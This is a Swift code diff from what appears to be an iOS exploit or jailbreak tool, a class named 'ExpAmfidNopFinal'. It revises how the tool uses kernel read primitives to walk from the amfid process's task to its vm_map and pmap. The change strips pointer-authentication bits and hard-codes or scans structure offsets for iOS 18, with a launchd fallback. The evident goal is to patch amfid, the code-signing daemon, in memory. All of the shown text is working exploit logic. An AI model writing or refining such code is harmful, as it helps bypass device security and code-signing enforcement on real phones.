@@ -185,72 +185,27 @@ final class ExpAmfidNopFinal {
             return
         }
         
-        // Read vm_map — use off_task_map from offsets
-        // If that fails, scan nearby offsets with multiple pmap offset candidates
-        var vmMap: UInt64 = 0
-        let taskMapOff = UInt64(off_task_map)
-        let candidate0 = ds_kread64(amfidTask + taskMapOff)
-        log("  vm_map (task+0x\(String(format:"%x", taskMapOff))): 0x\(String(format:"%llx", candidate0))")
-        
-        if candidate0 != 0 && (candidate0 >> 32) > 0xFFFFFF00 {
-            vmMap = candidate0
-        } else {
-            log("  ⚠️ vm_map invalid at off_task_map — scanning task struct...")
-            // Scan task struct for valid kernel pointers
-            // Try multiple pmap offsets (0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70)
-            // and multiple text base offsets (0x10, 0x18, 0x20)
-            for off: UInt64 in stride(from: 0x20, to: 0x100, by: 8) {
-                let val = ds_kread64(amfidTask + off)
-                if val == 0 || (val >> 32) <= 0xFFFFFF00 || val == amfidTask { continue }
-                
-                // Check multiple pmap offsets within this candidate
-                for pmapOff: UInt64 in [0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78] {
-                    let possiblePmap = ds_kread64(val + pmapOff)
-                    if possiblePmap == 0 || (possiblePmap >> 32) <= 0xFFFFFF00 { continue }
-                    
-                    // Check if pmap has a valid ttep at +0x0 (physical address)
-                    let possibleTtep = ds_kread64(possiblePmap + 0x0)
-                    if possibleTtep > 0x800000000 && possibleTtep < 0x900000000 {
-                        log("    ✅ task+0x\(String(format:"%02x", off)) → pmap@+0x\(String(format:"%x", pmapOff))=0x\(String(format:"%llx", possiblePmap)) → ttep=0x\(String(format:"%llx", possibleTtep))")
-                        vmMap = val
-                        break
-                    }
-                }
-                if vmMap != 0 { break }
-                
-                // Also check if any offset has a userspace text base (0x100000000+)
-                for minOff: UInt64 in [0x10, 0x18, 0x20, 0x28, 0x30] {
-                    let possibleMin = ds_kread64(val + minOff)
-                    if possibleMin >= 0x100000000 && possibleMin < 0x200000000 {
-                        log("    task+0x\(String(format:"%02x", off)) has text-like value at +0x\(String(format:"%x", minOff))=0x\(String(format:"%llx", possibleMin))")
-                    }
-                }
-            }
-            
-            if vmMap == 0 {
-                log("❌ Cannot find vm_map in task struct")
-                log("   Task struct layout unknown for this build")
-                log("   Falling back to launchd task_for_pid...")
-                performPatchViaLaunchd(amfidPid: amfidPid)
-                return
-            }
-        }
+        // Read vm_map — use ds_kreadptr (strips PAC!) instead of ds_kread64
+        // PAC-signed pointers look like garbage (0x99f7...) but are valid after xpaci
+        var vmMap = ds_kreadptr(amfidTask + UInt64(off_task_map))
+        log("  vm_map (task+0x\(String(format:"%x", off_task_map))): 0x\(String(format:"%llx", vmMap))")
         
         guard vmMap != 0 && (vmMap >> 32) > 0xFFFFFF00 else {
-            log("❌ vm_map invalid")
+            log("❌ vm_map invalid even after PAC strip")
+            log("   off_task_map may be wrong for this build")
             performPatchViaLaunchd(amfidPid: amfidPid)
             return
         }
         
-        // Read pmap
-        let pmap = ds_kread64(vmMap + 0x48)
+        // Read pmap (also PAC-signed)
+        let pmap = ds_kreadptr(vmMap + 0x48)
         log("  pmap (vm_map+0x48): 0x\(String(format:"%llx", pmap))")
         
         guard pmap != 0 && (pmap >> 32) > 0xFFFFFF00 else {
             log("❌ pmap invalid — offset 0x48 may be wrong")
             log("   Trying other offsets...")
             for off: UInt64 in [0x40, 0x48, 0x50, 0x58, 0x60] {
-                let val = ds_kread64(vmMap + off)
+                let val = ds_kreadptr(vmMap + off)
                 if val != 0 && (val >> 32) > 0xFFFFFF00 {
                     log("   vm_map+0x\(String(format:"%x", off)) = 0x\(String(format:"%llx", val)) ← possible pmap?")
                 }
@@ -561,8 +516,8 @@ final class ExpAmfidNopFinal {
         }
         log("  task: 0x\(String(format:"%llx", amfidTask))")
         
-        // task → vm_map (offset 0x28 on iOS 18)
-        let vmMap = ds_kread64(amfidTask + 0x28)
+        // task → vm_map (use ds_kreadptr to strip PAC!)
+        let vmMap = ds_kreadptr(amfidTask + UInt64(off_task_map))
         guard vmMap != 0 && (vmMap >> 32) > 0xFFFFFF00 else {
             log("❌ vm_map invalid: 0x\(String(format:"%llx", vmMap))")
             fallbackToLaunchd(amfidPid: amfidPid)
@@ -570,8 +525,8 @@ final class ExpAmfidNopFinal {
         }
         log("  vm_map: 0x\(String(format:"%llx", vmMap))")
         
-        // vm_map → pmap (offset 0x48 on iOS 18)
-        let pmap = ds_kread64(vmMap + 0x48)
+        // vm_map → pmap (use ds_kreadptr)
+        let pmap = ds_kreadptr(vmMap + 0x48)
         guard pmap != 0 && (pmap >> 32) > 0xFFFFFF00 else {
             log("❌ pmap invalid: 0x\(String(format:"%llx", pmap))")
             log("   vm_map+0x48 may be wrong offset for this build")
